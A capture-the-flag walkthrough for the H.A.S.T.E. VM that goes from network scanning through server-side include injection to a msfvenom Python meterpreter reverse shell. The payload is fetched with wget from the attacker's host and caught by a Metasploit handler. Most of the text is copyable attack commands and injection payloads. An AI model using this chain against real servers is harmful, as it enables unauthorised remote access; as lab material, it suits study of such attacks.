@@ -1,0 +1,44 @@
+
+Hack the H.A.S.T.E. VM Challenge
+
+Hello friends! Today we are going to take another CTF challenge known as ‘H.A.S.T.E.’. The credit for making this vm machine goes to “f1re_w1re” and it is a unique challenge as we just have to get a reverse shell just to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.0.102 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -sV 192.168.0.102
+
+We find port 80 is open, so we open the ip address in our browser.
+
+We don’t find anything on the page so we use dirb for listing directories on the web server.
+dirb http://192.168.1.102
+
+Now when we open http://192.168.0.102/ssi we get a hint that the website maybe vulnerable to server side injection.
+
+Now when we open http://192.168.0.102/index we find the code executed by the server.
+
+Now we go back to http://192.168.0.102/ and use server side injection to execute our commands.
+
+We executed ‘ls -al’ command to check if it is working, as u can see in the image below we successfully ran our command.
+<!–##EXEC cmd=”ls -la” –>
+
+Now we create a python payload using msfvenom.
+msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 > /root/Desktp/shell.py
+
+Now we upload our shell to the server using server side injection.
+<!–##EXEC cmd=”wget http://192.168.0.107/shell.py” –>
+
+After successfully uploading the shell we use server side injection to execute our payload.
+<!–##EXEC cmd=”python shell.py” –>
+
+We setup our listener using metasploit.
+msf > use exploit/multi/handler
+msf exploit(handler)> set payload python/meterpreter/reverse_tcp
+msf exploit(handler)> set lhost 192.168.0.107
+msf exploit(handler)> set lport 4444
+msf exploit(handler)> exploit
+
+As soon as we execute our payload we get reverse shell. The main objective of the challenge was to get a reverse shell.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
